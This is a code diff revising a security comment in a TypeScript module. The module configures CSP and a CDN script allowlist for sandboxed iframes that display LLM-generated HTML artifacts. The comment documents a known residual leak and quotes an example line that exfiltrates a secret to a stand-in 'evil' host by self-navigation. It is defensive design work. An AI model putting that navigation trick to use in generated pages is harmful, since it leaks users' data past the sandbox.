@@ -10,10 +10,16 @@ export { looksLikeInteractiveHtml };
 // DEFAULT. LLM-generated artifacts routinely reference `<script src="https://cdn.tailwindcss.com">`
 // (or unpkg / jsdelivr / cdnjs) and cannot compute an offline SRI hash, so the SRI-gated `scripts`
 // permission is impractical for the model to satisfy — without this, such artifacts render blank.
-// The safety boundary is preserved by (1) the iframe sandbox (null origin, no allow-same-origin,
-// separate process) and (2) the default `connect-src 'none'` / `form-action 'none'`: a script from
-// these hosts can build UI but cannot exfiltrate data or navigate without a separately-granted
-// permission. Host-only origins (no exact-URL SRI) — these hosts are immutable-by-version registries.
+// Containment: the iframe sandbox (null origin, no allow-same-origin, separate process) means even
+// arbitrary script here has ZERO access to Node/Electron/IPC, and the default `connect-src 'none'` /
+// `form-action 'none'` block network/form exfil. CAVEAT: this does NOT make the frame
+// exfil-proof — a script can still self-navigate its own browsing context
+// (`location = 'https://evil/?d='+secret`), which no CSP directive or sandbox token gates; this is a
+// PRE-EXISTING channel already reachable via the always-present `'unsafe-inline'`, not new to this
+// allowlist. Note too that jsdelivr/unpkg are open-publish (anyone can publish), unlike the narrower
+// cdn.tailwindcss.com / PR-moderated cdnjs — widening script-src to them lowers the bar for smuggling
+// a plausible-looking exploit past review. Accepted as a deliberate tradeoff to unblank CDN artifacts;
+// full closure would need per-artifact will-frame-navigate interception (tracked as follow-up).
 // (Declared before INTERACTIVE_HTML_CSP below, which calls buildInteractiveHtmlCsp() at module load.)
 const DEFAULT_SCRIPT_CDNS: readonly string[] = [
   'https://cdn.tailwindcss.com',
